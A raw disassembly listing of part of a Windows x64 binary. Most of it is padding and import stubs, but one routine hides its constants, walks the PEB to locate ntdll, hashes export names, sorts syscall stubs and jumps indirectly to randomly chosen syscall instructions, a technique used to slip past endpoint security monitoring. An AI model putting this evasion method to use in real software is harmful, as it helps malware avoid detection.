   140009692:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009696:	66 89 05 eb 54 28 00 	mov    %ax,0x2854eb(%rip)        # 0x14028eb88
   14000969d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400096a1:	66 89 05 e2 54 28 00 	mov    %ax,0x2854e2(%rip)        # 0x14028eb8a
   1400096a8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400096ac:	66 89 05 d9 54 28 00 	mov    %ax,0x2854d9(%rip)        # 0x14028eb8c
   1400096b3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400096b7:	66 89 05 d0 54 28 00 	mov    %ax,0x2854d0(%rip)        # 0x14028eb8e
   1400096be:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   1400096c2:	66 89 05 c7 54 28 00 	mov    %ax,0x2854c7(%rip)        # 0x14028eb90
   1400096c9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   1400096cd:	66 89 05 be 54 28 00 	mov    %ax,0x2854be(%rip)        # 0x14028eb92
   1400096d4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   1400096d8:	66 89 05 b5 54 28 00 	mov    %ax,0x2854b5(%rip)        # 0x14028eb94
   1400096df:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400096e3:	66 89 05 ac 54 28 00 	mov    %ax,0x2854ac(%rip)        # 0x14028eb96
   1400096ea:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   1400096ee:	66 89 05 a3 54 28 00 	mov    %ax,0x2854a3(%rip)        # 0x14028eb98
   1400096f5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   1400096f9:	66 89 05 9a 54 28 00 	mov    %ax,0x28549a(%rip)        # 0x14028eb9a
   140009700:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140009704:	66 89 05 91 54 28 00 	mov    %ax,0x285491(%rip)        # 0x14028eb9c
   14000970b:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   14000970f:	66 89 05 88 54 28 00 	mov    %ax,0x285488(%rip)        # 0x14028eb9e
   140009716:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   14000971a:	66 89 05 7f 54 28 00 	mov    %ax,0x28547f(%rip)        # 0x14028eba0
   140009721:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   140009725:	66 89 05 76 54 28 00 	mov    %ax,0x285476(%rip)        # 0x14028eba2
   14000972c:	0f b7 41 44          	movzwl 0x44(%rcx),%eax
   140009730:	66 89 05 6d 54 28 00 	mov    %ax,0x28546d(%rip)        # 0x14028eba4
   140009737:	c3                   	ret
   140009738:	cc                   	int3
   140009739:	cc                   	int3
   14000973a:	cc                   	int3
   14000973b:	cc                   	int3
   14000973c:	cc                   	int3
   14000973d:	cc                   	int3
   14000973e:	cc                   	int3
   14000973f:	cc                   	int3
   140009740:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009743:	0f 29 05 46 54 28 00 	movaps %xmm0,0x285446(%rip)        # 0x14028eb90
   14000974a:	0f 29 05 2f 54 28 00 	movaps %xmm0,0x28542f(%rip)        # 0x14028eb80
   140009751:	0f 29 05 18 54 28 00 	movaps %xmm0,0x285418(%rip)        # 0x14028eb70
   140009758:	0f 29 05 01 54 28 00 	movaps %xmm0,0x285401(%rip)        # 0x14028eb60
   14000975f:	48 c7 05 34 54 28 00 	movq   $0x0,0x285434(%rip)        # 0x14028eb9e
   140009766:	00 00 00 00 
   14000976a:	c3                   	ret
   14000976b:	cc                   	int3
   14000976c:	cc                   	int3
   14000976d:	cc                   	int3
   14000976e:	cc                   	int3
   14000976f:	cc                   	int3
   140009770:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009773:	0f 11 05 40 54 28 00 	movups %xmm0,0x285440(%rip)        # 0x14028ebba
   14000977a:	0f 29 05 2f 54 28 00 	movaps %xmm0,0x28542f(%rip)        # 0x14028ebb0
   140009781:	c3                   	ret
   140009782:	cc                   	int3
   140009783:	cc                   	int3
   140009784:	cc                   	int3
   140009785:	cc                   	int3
   140009786:	cc                   	int3
   140009787:	cc                   	int3
   140009788:	cc                   	int3
   140009789:	cc                   	int3
   14000978a:	cc                   	int3
   14000978b:	cc                   	int3
   14000978c:	cc                   	int3
   14000978d:	cc                   	int3
   14000978e:	cc                   	int3
   14000978f:	cc                   	int3
   140009790:	48 8d 0d 35 54 28 00 	lea    0x285435(%rip),%rcx        # 0x14028ebcc
   140009797:	41 b8 24 05 00 00    	mov    $0x524,%r8d
   14000979d:	31 d2                	xor    %edx,%edx
   14000979f:	e9 2c 06 00 00       	jmp    0x140009dd0
   1400097a4:	cc                   	int3
   1400097a5:	cc                   	int3
   1400097a6:	cc                   	int3
   1400097a7:	cc                   	int3
   1400097a8:	cc                   	int3
   1400097a9:	cc                   	int3
   1400097aa:	cc                   	int3
   1400097ab:	cc                   	int3
   1400097ac:	cc                   	int3
   1400097ad:	cc                   	int3
   1400097ae:	cc                   	int3
   1400097af:	cc                   	int3
   1400097b0:	8d 81 ba 2d 80 7a    	lea    0x7a802dba(%rcx),%eax
   1400097b6:	c3                   	ret
   1400097b7:	cc                   	int3
   1400097b8:	cc                   	int3
   1400097b9:	cc                   	int3
   1400097ba:	cc                   	int3
   1400097bb:	cc                   	int3
   1400097bc:	cc                   	int3
   1400097bd:	cc                   	int3
   1400097be:	cc                   	int3
   1400097bf:	cc                   	int3
   1400097c0:	41 57                	push   %r15
   1400097c2:	41 56                	push   %r14
   1400097c4:	41 55                	push   %r13
   1400097c6:	41 54                	push   %r12
   1400097c8:	56                   	push   %rsi
   1400097c9:	57                   	push   %rdi
   1400097ca:	55                   	push   %rbp
   1400097cb:	53                   	push   %rbx
   1400097cc:	48 83 ec 38          	sub    $0x38,%rsp
   1400097d0:	89 ce                	mov    %ecx,%esi
   1400097d2:	44 8b 2d a7 46 28 00 	mov    0x2846a7(%rip),%r13d        # 0x14028de80
   1400097d9:	45 85 ed             	test   %r13d,%r13d
   1400097dc:	74 2d                	je     0x14000980b
   1400097de:	48 8b 1d a3 46 28 00 	mov    0x2846a3(%rip),%rbx        # 0x14028de88
   1400097e5:	44 89 e8             	mov    %r13d,%eax
   1400097e8:	31 ff                	xor    %edi,%edi
   1400097ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400097f0:	39 34 fb             	cmp    %esi,(%rbx,%rdi,8)
   1400097f3:	0f 84 5d 02 00 00    	je     0x140009a56
   1400097f9:	48 ff c7             	inc    %rdi
   1400097fc:	48 39 f8             	cmp    %rdi,%rax
   1400097ff:	75 ef                	jne    0x1400097f0
   140009801:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140009806:	e9 4b 02 00 00       	jmp    0x140009a56
   14000980b:	b9 a6 d2 7f 85       	mov    $0x857fd2a6,%ecx
   140009810:	e8 9b ff ff ff       	call   0x1400097b0
   140009815:	89 c0                	mov    %eax,%eax
   140009817:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000981b:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000981f:	48 8b 58 10          	mov    0x10(%rax),%rbx
   140009823:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   140009827:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   14000982c:	4d 85 ed             	test   %r13,%r13
   14000982f:	0f 84 21 02 00 00    	je     0x140009a56
   140009835:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140009839:	b9 82 d2 7f 85       	mov    $0x857fd282,%ecx
   14000983e:	e8 6d ff ff ff       	call   0x1400097b0
   140009843:	41 89 c6             	mov    %eax,%r14d
   140009846:	45 31 e4             	xor    %r12d,%r12d
   140009849:	eb 14                	jmp    0x14000985f
   14000984b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009850:	4d 89 ec             	mov    %r13,%r12
   140009853:	48 8b 1b             	mov    (%rbx),%rbx
   140009856:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   14000985a:	4d 85 ed             	test   %r13,%r13
   14000985d:	74 56                	je     0x1400098b5
   14000985f:	4d 89 ef             	mov    %r13,%r15
   140009862:	43 8b 04 2e          	mov    (%r14,%r13,1),%eax
   140009866:	46 8b ac 28 88 00 00 	mov    0x88(%rax,%r13,1),%r13d
   14000986d:	00 
   14000986e:	4d 85 ed             	test   %r13,%r13
   140009871:	74 e0                	je     0x140009853
   140009873:	43 8b 6c 3d 0c       	mov    0xc(%r13,%r15,1),%ebp
   140009878:	4d 01 fd             	add    %r15,%r13
   14000987b:	46 8b 64 3d 00       	mov    0x0(%rbp,%r15,1),%r12d
   140009880:	b9 b4 46 e4 f1       	mov    $0xf1e446b4,%ecx
   140009885:	e8 26 ff ff ff       	call   0x1400097b0
   14000988a:	41 39 c4             	cmp    %eax,%r12d
   14000988d:	75 c1                	jne    0x140009850
   14000988f:	4c 01 fd             	add    %r15,%rbp
   140009892:	4d 89 ec             	mov    %r13,%r12
   140009895:	b9 4a d2 7f 85       	mov    $0x857fd24a,%ecx
   14000989a:	e8 11 ff ff ff       	call   0x1400097b0
   14000989f:	89 c0                	mov    %eax,%eax
   1400098a1:	8b 6c 05 00          	mov    0x0(%rbp,%rax,1),%ebp
   1400098a5:	b9 b2 00 e4 f1       	mov    $0xf1e400b2,%ecx
   1400098aa:	e8 01 ff ff ff       	call   0x1400097b0
   1400098af:	39 c5                	cmp    %eax,%ebp
   1400098b1:	75 a0                	jne    0x140009853
   1400098b3:	eb 09                	jmp    0x1400098be
   1400098b5:	4d 85 e4             	test   %r12,%r12
   1400098b8:	0f 84 98 01 00 00    	je     0x140009a56
   1400098be:	4c 89 3d 73 58 28 00 	mov    %r15,0x285873(%rip)        # 0x14028f138
   1400098c5:	b9 2e d6 7f 85       	mov    $0x857fd62e,%ecx
   1400098ca:	e8 e1 fe ff ff       	call   0x1400097b0
   1400098cf:	89 c6                	mov    %eax,%esi
   1400098d1:	89 c1                	mov    %eax,%ecx
   1400098d3:	48 c1 e1 03          	shl    $0x3,%rcx
   1400098d7:	e8 c4 03 00 00       	call   0x140009ca0
   1400098dc:	48 89 05 a5 45 28 00 	mov    %rax,0x2845a5(%rip)        # 0x14028de88
   1400098e3:	41 8b 6c 24 18       	mov    0x18(%r12),%ebp
   1400098e8:	85 ed                	test   %ebp,%ebp
   1400098ea:	0f 84 5c 01 00 00    	je     0x140009a4c
   1400098f0:	85 f6                	test   %esi,%esi
   1400098f2:	0f 84 54 01 00 00    	je     0x140009a4c
   1400098f8:	48 89 c3             	mov    %rax,%rbx
   1400098fb:	b9 66 d2 7f 85       	mov    $0x857fd266,%ecx
   140009900:	e8 ab fe ff ff       	call   0x1400097b0
   140009905:	89 c0                	mov    %eax,%eax
   140009907:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000990c:	b9 a0 49 80 85       	mov    $0x858049a0,%ecx
   140009911:	e8 9a fe ff ff       	call   0x1400097b0
   140009916:	89 e9                	mov    %ebp,%ecx
   140009918:	89 c2                	mov    %eax,%edx
   14000991a:	45 31 f6             	xor    %r14d,%r14d
   14000991d:	45 31 ed             	xor    %r13d,%r13d
   140009920:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140009924:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140009928:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000992f:	00 
   140009930:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009935:	41 8b 04 04          	mov    (%r12,%rax,1),%eax
   140009939:	4c 01 f8             	add    %r15,%rax
   14000993c:	42 8b 2c b0          	mov    (%rax,%r14,4),%ebp
   140009940:	41 0f b7 04 2f       	movzwl (%r15,%rbp,1),%eax
   140009945:	39 c2                	cmp    %eax,%edx
   140009947:	0f 85 d6 00 00 00    	jne    0x140009a23
   14000994d:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   140009951:	84 c0                	test   %al,%al
   140009953:	74 4d                	je     0x1400099a2
   140009955:	4c 01 fd             	add    %r15,%rbp
   140009958:	b9 45 d2 7f 85       	mov    $0x857fd245,%ecx
   14000995d:	e8 4e fe ff ff       	call   0x1400097b0
   140009962:	41 b9 ba 2d 80 7a    	mov    $0x7a802dba,%r9d
   140009968:	ba 01 00 00 00       	mov    $0x1,%edx
   14000996d:	45 31 c0             	xor    %r8d,%r8d
   140009970:	44 89 c9             	mov    %r9d,%ecx
   140009973:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000997a:	84 00 00 00 00 00 
   140009980:	45 0f b7 04 28       	movzwl (%r8,%rbp,1),%r8d
   140009985:	c1 c1 18             	rol    $0x18,%ecx
   140009988:	44 01 c9             	add    %r9d,%ecx
   14000998b:	44 01 c1             	add    %r8d,%ecx
   14000998e:	21 c1                	and    %eax,%ecx
   140009990:	41 89 d0             	mov    %edx,%r8d
   140009993:	ff c2                	inc    %edx
   140009995:	42 80 7c 05 00 00    	cmpb   $0x0,0x0(%rbp,%r8,1)
   14000999b:	41 89 c9             	mov    %ecx,%r9d
   14000999e:	75 e0                	jne    0x140009980
   1400099a0:	eb 05                	jmp    0x1400099a7
   1400099a2:	b9 ba 2d 80 7a       	mov    $0x7a802dba,%ecx
   1400099a7:	44 89 ed             	mov    %r13d,%ebp
   1400099aa:	89 0c eb             	mov    %ecx,(%rbx,%rbp,8)
   1400099ad:	b9 62 d2 7f 85       	mov    $0x857fd262,%ecx
   1400099b2:	e8 f9 fd ff ff       	call   0x1400097b0
   1400099b7:	89 c0                	mov    %eax,%eax
   1400099b9:	42 8b 34 20          	mov    (%rax,%r12,1),%esi
   1400099bd:	4c 01 fe             	add    %r15,%rsi
   1400099c0:	b9 6a d2 7f 85       	mov    $0x857fd26a,%ecx
   1400099c5:	e8 e6 fd ff ff       	call   0x1400097b0
   1400099ca:	89 c0                	mov    %eax,%eax
   1400099cc:	42 8b 04 20          	mov    (%rax,%r12,1),%eax
   1400099d0:	4c 01 f8             	add    %r15,%rax
   1400099d3:	42 0f b7 04 70       	movzwl (%rax,%r14,2),%eax
   1400099d8:	8b 04 86             	mov    (%rsi,%rax,4),%eax
   1400099db:	89 44 eb 04          	mov    %eax,0x4(%rbx,%rbp,8)
   1400099df:	44 89 e8             	mov    %r13d,%eax
   1400099e2:	45 85 ed             	test   %r13d,%r13d
   1400099e5:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   1400099e9:	74 2d                	je     0x140009a18
   1400099eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400099f0:	89 c1                	mov    %eax,%ecx
   1400099f2:	8b 54 cb 04          	mov    0x4(%rbx,%rcx,8),%edx
   1400099f6:	ff c8                	dec    %eax
   1400099f8:	3b 54 c3 04          	cmp    0x4(%rbx,%rax,8),%edx
   1400099fc:	73 15                	jae    0x140009a13
   1400099fe:	48 8b 14 cb          	mov    (%rbx,%rcx,8),%rdx
   140009a02:	4c 8b 04 c3          	mov    (%rbx,%rax,8),%r8
   140009a06:	4c 89 04 cb          	mov    %r8,(%rbx,%rcx,8)
   140009a0a:	48 89 14 c3          	mov    %rdx,(%rbx,%rax,8)
   140009a0e:	48 85 c0             	test   %rax,%rax
   140009a11:	75 dd                	jne    0x1400099f0
   140009a13:	41 8b 4c 24 18       	mov    0x18(%r12),%ecx
   140009a18:	41 ff c5             	inc    %r13d
   140009a1b:	8b 74 24 28          	mov    0x28(%rsp),%esi
   140009a1f:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140009a23:	49 ff c6             	inc    %r14
   140009a26:	89 c8                	mov    %ecx,%eax
   140009a28:	49 39 c6             	cmp    %rax,%r14
   140009a2b:	73 09                	jae    0x140009a36
   140009a2d:	41 39 f5             	cmp    %esi,%r13d
   140009a30:	0f 82 fa fe ff ff    	jb     0x140009930
   140009a36:	44 89 2d 43 44 28 00 	mov    %r13d,0x284443(%rip)        # 0x14028de80
   140009a3d:	45 85 ed             	test   %r13d,%r13d
   140009a40:	8b 74 24 20          	mov    0x20(%rsp),%esi
   140009a44:	0f 85 9b fd ff ff    	jne    0x1400097e5
   140009a4a:	eb 0a                	jmp    0x140009a56
   140009a4c:	c7 05 2a 44 28 00 00 	movl   $0x0,0x28442a(%rip)        # 0x14028de80
   140009a53:	00 00 00 
   140009a56:	89 f8                	mov    %edi,%eax
   140009a58:	48 83 c4 38          	add    $0x38,%rsp
   140009a5c:	5b                   	pop    %rbx
   140009a5d:	5d                   	pop    %rbp
   140009a5e:	5f                   	pop    %rdi
   140009a5f:	5e                   	pop    %rsi
   140009a60:	41 5c                	pop    %r12
   140009a62:	41 5d                	pop    %r13
   140009a64:	41 5e                	pop    %r14
   140009a66:	41 5f                	pop    %r15
   140009a68:	c3                   	ret
   140009a69:	cc                   	int3
   140009a6a:	cc                   	int3
   140009a6b:	cc                   	int3
   140009a6c:	cc                   	int3
   140009a6d:	cc                   	int3
   140009a6e:	cc                   	int3
   140009a6f:	cc                   	int3
   140009a70:	41 57                	push   %r15
   140009a72:	41 56                	push   %r14
   140009a74:	41 55                	push   %r13
   140009a76:	41 54                	push   %r12
   140009a78:	56                   	push   %rsi
   140009a79:	57                   	push   %rdi
   140009a7a:	55                   	push   %rbp
   140009a7b:	53                   	push   %rbx
   140009a7c:	48 83 ec 38          	sub    $0x38,%rsp
   140009a80:	44 8b 3d ad 56 28 00 	mov    0x2856ad(%rip),%r15d        # 0x14028f134
   140009a87:	41 8d 47 01          	lea    0x1(%r15),%eax
   140009a8b:	89 05 a3 56 28 00    	mov    %eax,0x2856a3(%rip)        # 0x14028f134
   140009a91:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   140009a96:	42 8d 34 38          	lea    (%rax,%r15,1),%esi
   140009a9a:	81 c6 ba 2d 80 7a    	add    $0x7a802dba,%esi
   140009aa0:	89 74 24 24          	mov    %esi,0x24(%rsp)
   140009aa4:	8b 1d f6 42 28 00    	mov    0x2842f6(%rip),%ebx        # 0x14028dda0
   140009aaa:	83 fb ff             	cmp    $0xffffffff,%ebx
   140009aad:	74 13                	je     0x140009ac2
   140009aaf:	4c 8b 25 82 56 28 00 	mov    0x285682(%rip),%r12        # 0x14028f138
   140009ab6:	48 8b 3d cb 43 28 00 	mov    0x2843cb(%rip),%rdi        # 0x14028de88
   140009abd:	e9 95 00 00 00       	jmp    0x140009b57
   140009ac2:	b9 86 d2 7f 85       	mov    $0x857fd286,%ecx
   140009ac7:	e8 e4 fc ff ff       	call   0x1400097b0
   140009acc:	4c 8b 25 65 56 28 00 	mov    0x285665(%rip),%r12        # 0x14028f138
   140009ad3:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140009ad8:	48 8b 3d a9 43 28 00 	mov    0x2843a9(%rip),%rdi        # 0x14028de88
   140009adf:	85 c0                	test   %eax,%eax
   140009ae1:	74 74                	je     0x140009b57
   140009ae3:	89 c5                	mov    %eax,%ebp
   140009ae5:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140009aea:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140009aef:	44 8b 77 04          	mov    0x4(%rdi),%r14d
   140009af3:	b9 55 d2 7f 85       	mov    $0x857fd255,%ecx
   140009af8:	e8 b3 fc ff ff       	call   0x1400097b0
   140009afd:	89 c7                	mov    %eax,%edi
   140009aff:	41 89 ef             	mov    %ebp,%r15d
   140009b02:	4d 01 e6             	add    %r12,%r14
   140009b05:	45 31 ed             	xor    %r13d,%r13d
   140009b08:	eb 0e                	jmp    0x140009b18
   140009b0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009b10:	49 ff c5             	inc    %r13
   140009b13:	4d 39 ef             	cmp    %r13,%r15
   140009b16:	74 35                	je     0x140009b4d
   140009b18:	43 0f b6 04 2e       	movzbl (%r14,%r13,1),%eax
   140009b1d:	39 c7                	cmp    %eax,%edi
   140009b1f:	75 ef                	jne    0x140009b10
   140009b21:	b9 47 d2 7f 85       	mov    $0x857fd247,%ecx
   140009b26:	e8 85 fc ff ff       	call   0x1400097b0
   140009b2b:	89 c0                	mov    %eax,%eax
   140009b2d:	4b 8d 0c 2e          	lea    (%r14,%r13,1),%rcx
   140009b31:	0f b6 2c 08          	movzbl (%rax,%rcx,1),%ebp
   140009b35:	b9 4b d2 7f 85       	mov    $0x857fd24b,%ecx
   140009b3a:	e8 71 fc ff ff       	call   0x1400097b0
   140009b3f:	39 e8                	cmp    %ebp,%eax
   140009b41:	75 cd                	jne    0x140009b10
   140009b43:	44 89 2d 56 42 28 00 	mov    %r13d,0x284256(%rip)        # 0x14028dda0
   140009b4a:	44 89 eb             	mov    %r13d,%ebx
   140009b4d:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140009b52:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140009b57:	b9 53 38 99 85       	mov    $0x85993853,%ecx
   140009b5c:	e8 4f fc ff ff       	call   0x1400097b0
   140009b61:	41 89 c5             	mov    %eax,%r13d
   140009b64:	b9 a5 c5 ee c1       	mov    $0xc1eec5a5,%ecx
   140009b69:	e8 42 fc ff ff       	call   0x1400097b0
   140009b6e:	41 89 c6             	mov    %eax,%r14d
   140009b71:	8b 05 09 43 28 00    	mov    0x284309(%rip),%eax        # 0x14028de80
   140009b77:	ff c8                	dec    %eax
   140009b79:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009b7d:	48 63 eb             	movslq %ebx,%rbp
   140009b80:	b9 55 d2 7f 85       	mov    $0x857fd255,%ecx
   140009b85:	e8 26 fc ff ff       	call   0x1400097b0
   140009b8a:	89 c3                	mov    %eax,%ebx
   140009b8c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140009b91:	41 0f af f5          	imul   %r13d,%esi
   140009b95:	44 01 f6             	add    %r14d,%esi
   140009b98:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   140009b9d:	41 01 c7             	add    %eax,%r15d
   140009ba0:	41 81 c7 bb 2d 80 7a 	add    $0x7a802dbb,%r15d
   140009ba7:	eb 0e                	jmp    0x140009bb7
   140009ba9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009bb0:	03 74 24 28          	add    0x28(%rsp),%esi
   140009bb4:	41 ff c7             	inc    %r15d
   140009bb7:	44 89 7c 24 24       	mov    %r15d,0x24(%rsp)
   140009bbc:	89 f0                	mov    %esi,%eax
   140009bbe:	31 d2                	xor    %edx,%edx
   140009bc0:	f7 74 24 30          	divl   0x30(%rsp)
   140009bc4:	48 63 c2             	movslq %edx,%rax
   140009bc7:	44 8b 74 c7 04       	mov    0x4(%rdi,%rax,8),%r14d
   140009bcc:	4d 01 e6             	add    %r12,%r14
   140009bcf:	42 0f b6 44 35 00    	movzbl 0x0(%rbp,%r14,1),%eax
   140009bd5:	39 c3                	cmp    %eax,%ebx
   140009bd7:	75 d7                	jne    0x140009bb0
   140009bd9:	49 01 ee             	add    %rbp,%r14
   140009bdc:	b9 47 d2 7f 85       	mov    $0x857fd247,%ecx
   140009be1:	e8 ca fb ff ff       	call   0x1400097b0
   140009be6:	89 c0                	mov    %eax,%eax
   140009be8:	49 89 fd             	mov    %rdi,%r13
   140009beb:	4c 89 e7             	mov    %r12,%rdi
   140009bee:	45 0f b6 24 06       	movzbl (%r14,%rax,1),%r12d
   140009bf3:	b9 4b d2 7f 85       	mov    $0x857fd24b,%ecx
   140009bf8:	e8 b3 fb ff ff       	call   0x1400097b0
   140009bfd:	44 39 e0             	cmp    %r12d,%eax
   140009c00:	49 89 fc             	mov    %rdi,%r12
   140009c03:	4c 89 ef             	mov    %r13,%rdi
   140009c06:	75 a8                	jne    0x140009bb0
   140009c08:	4c 89 f0             	mov    %r14,%rax
   140009c0b:	48 83 c4 38          	add    $0x38,%rsp
   140009c0f:	5b                   	pop    %rbx
   140009c10:	5d                   	pop    %rbp
   140009c11:	5f                   	pop    %rdi
   140009c12:	5e                   	pop    %rsi
   140009c13:	41 5c                	pop    %r12
   140009c15:	41 5d                	pop    %r13
   140009c17:	41 5e                	pop    %r14
   140009c19:	41 5f                	pop    %r15
   140009c1b:	c3                   	ret
   140009c1c:	cc                   	int3
   140009c1d:	cc                   	int3
   140009c1e:	cc                   	int3
   140009c1f:	cc                   	int3
   140009c20:	ff 25 42 1f 00 00    	jmp    *0x1f42(%rip)        # 0x14000bb68
   140009c26:	cc                   	int3
   140009c27:	cc                   	int3
   140009c28:	cc                   	int3
   140009c29:	cc                   	int3
   140009c2a:	cc                   	int3
   140009c2b:	cc                   	int3
   140009c2c:	cc                   	int3
   140009c2d:	cc                   	int3
   140009c2e:	cc                   	int3
   140009c2f:	cc                   	int3
   140009c30:	ff 25 3a 1f 00 00    	jmp    *0x1f3a(%rip)        # 0x14000bb70
   140009c36:	cc                   	int3
   140009c37:	cc                   	int3
   140009c38:	cc                   	int3
   140009c39:	cc                   	int3
   140009c3a:	cc                   	int3
   140009c3b:	cc                   	int3
   140009c3c:	cc                   	int3
   140009c3d:	cc                   	int3
   140009c3e:	cc                   	int3
   140009c3f:	cc                   	int3
   140009c40:	ff 25 42 1f 00 00    	jmp    *0x1f42(%rip)        # 0x14000bb88
   140009c46:	cc                   	int3
   140009c47:	cc                   	int3
   140009c48:	cc                   	int3
   140009c49:	cc                   	int3
   140009c4a:	cc                   	int3
   140009c4b:	cc                   	int3
   140009c4c:	cc                   	int3
   140009c4d:	cc                   	int3
   140009c4e:	cc                   	int3
   140009c4f:	cc                   	int3
   140009c50:	ff 25 42 1f 00 00    	jmp    *0x1f42(%rip)        # 0x14000bb98
   140009c56:	cc                   	int3
   140009c57:	cc                   	int3
   140009c58:	cc                   	int3
   140009c59:	cc                   	int3
   140009c5a:	cc                   	int3
   140009c5b:	cc                   	int3
   140009c5c:	cc                   	int3
   140009c5d:	cc                   	int3
   140009c5e:	cc                   	int3
   140009c5f:	cc                   	int3
   140009c60:	ff 25 3a 1f 00 00    	jmp    *0x1f3a(%rip)        # 0x14000bba0
   140009c66:	cc                   	int3
   140009c67:	cc                   	int3
   140009c68:	cc                   	int3
   140009c69:	cc                   	int3
   140009c6a:	cc                   	int3
   140009c6b:	cc                   	int3
   140009c6c:	cc                   	int3
   140009c6d:	cc                   	int3
   140009c6e:	cc                   	int3
   140009c6f:	cc                   	int3
   140009c70:	ff 25 42 1f 00 00    	jmp    *0x1f42(%rip)        # 0x14000bbb8
   140009c76:	cc                   	int3
   140009c77:	cc                   	int3
   140009c78:	cc                   	int3
   140009c79:	cc                   	int3
   140009c7a:	cc                   	int3
   140009c7b:	cc                   	int3
   140009c7c:	cc                   	int3
   140009c7d:	cc                   	int3
   140009c7e:	cc                   	int3
   140009c7f:	cc                   	int3
   140009c80:	ff 25 3a 1f 00 00    	jmp    *0x1f3a(%rip)        # 0x14000bbc0
   140009c86:	cc                   	int3
   140009c87:	cc                   	int3
   140009c88:	cc                   	int3
   140009c89:	cc                   	int3
   140009c8a:	cc                   	int3
   140009c8b:	cc                   	int3
   140009c8c:	cc                   	int3
   140009c8d:	cc                   	int3
   140009c8e:	cc                   	int3
   140009c8f:	cc                   	int3
   140009c90:	ff 25 52 1f 00 00    	jmp    *0x1f52(%rip)        # 0x14000bbe8
   140009c96:	cc                   	int3
   140009c97:	cc                   	int3
   140009c98:	cc                   	int3
   140009c99:	cc                   	int3
   140009c9a:	cc                   	int3
   140009c9b:	cc                   	int3
   140009c9c:	cc                   	int3
   140009c9d:	cc                   	int3
   140009c9e:	cc                   	int3
   140009c9f:	cc                   	int3
   140009ca0:	ff 25 62 1f 00 00    	jmp    *0x1f62(%rip)        # 0x14000bc08
   140009ca6:	cc                   	int3
   140009ca7:	cc                   	int3
   140009ca8:	cc                   	int3
   140009ca9:	cc                   	int3
   140009caa:	cc                   	int3
   140009cab:	cc                   	int3
   140009cac:	cc                   	int3
   140009cad:	cc                   	int3
   140009cae:	cc                   	int3
   140009caf:	cc                   	int3
   140009cb0:	ff 25 5a 1f 00 00    	jmp    *0x1f5a(%rip)        # 0x14000bc10
   140009cb6:	cc                   	int3
   140009cb7:	cc                   	int3
   140009cb8:	cc                   	int3
   140009cb9:	cc                   	int3
   140009cba:	cc                   	int3
   140009cbb:	cc                   	int3
   140009cbc:	cc                   	int3
   140009cbd:	cc                   	int3
   140009cbe:	cc                   	int3
   140009cbf:	cc                   	int3
   140009cc0:	ff 25 62 1f 00 00    	jmp    *0x1f62(%rip)        # 0x14000bc28
   140009cc6:	cc                   	int3
   140009cc7:	cc                   	int3
   140009cc8:	cc                   	int3
   140009cc9:	cc                   	int3
   140009cca:	cc                   	int3
   140009ccb:	cc                   	int3
   140009ccc:	cc                   	int3
   140009ccd:	cc                   	int3
   140009cce:	cc                   	int3
   140009ccf:	cc                   	int3
   140009cd0:	ff 25 6a 1f 00 00    	jmp    *0x1f6a(%rip)        # 0x14000bc40
   140009cd6:	cc                   	int3
   140009cd7:	cc                   	int3
   140009cd8:	cc                   	int3
   140009cd9:	cc                   	int3
   140009cda:	cc                   	int3
   140009cdb:	cc                   	int3
   140009cdc:	cc                   	int3
   140009cdd:	cc                   	int3
   140009cde:	cc                   	int3
   140009cdf:	cc                   	int3
   140009ce0:	ff 25 62 1f 00 00    	jmp    *0x1f62(%rip)        # 0x14000bc48
   140009ce6:	cc                   	int3
   140009ce7:	cc                   	int3
   140009ce8:	cc                   	int3
   140009ce9:	cc                   	int3
   140009cea:	cc                   	int3
   140009ceb:	cc                   	int3
   140009cec:	cc                   	int3
   140009ced:	cc                   	int3
   140009cee:	cc                   	int3
   140009cef:	cc                   	int3
   140009cf0:	ff 25 5a 1f 00 00    	jmp    *0x1f5a(%rip)        # 0x14000bc50
   140009cf6:	cc                   	int3
   140009cf7:	cc                   	int3
   140009cf8:	cc                   	int3
   140009cf9:	cc                   	int3
